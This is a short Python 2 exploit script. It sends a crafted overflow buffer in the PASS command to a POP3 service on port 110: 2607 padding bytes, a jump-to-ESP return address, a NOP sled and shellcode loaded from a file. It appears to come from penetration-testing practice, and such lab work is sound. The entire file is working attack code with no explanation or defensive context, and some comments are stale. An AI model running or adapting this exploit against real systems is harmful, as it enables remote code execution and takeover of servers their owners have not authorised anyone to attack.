#!/usr/bin/python
import socket
import sys
import time

# Create an array of buffers, from 1 to 5900, with increments of 200.

# string=open('pattern.txt','r').read()
#string = 'A'*2607 + 'B'*4 + 'C'*(3500-2607-4)
shellcode = open('shellcode','rb').read().decode('hex')
#shellcode = (shellcode)

esp_add = "\x8f\x35\x4a\x5f" 
string = 'A'*2607 + esp_add + "\x90"*8 + shellcode
print (string) 
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "\nSending evil buffer..."
	print string
	s.connect((sys.argv[1],110)) # connect to IP, POP3 port
	data = s.recv(1024) # receive banner
	print data # print banner
	s.send('USER test' +'\r\n') # send username "test"
	data = s.recv(1024) # receive reply
	print data # print reply
	s.send('PASS' + string + '\r\n') # send password "test"
	data = s.recv(1024) # receive reply
	print data # print reply
	s.send('QUIT\r\n')
	s.close() # close socket
	print "\nDone!"
	time.sleep(3)
except Exception as e:  
	print(e)	 
	print "Could not connect to POP3!"
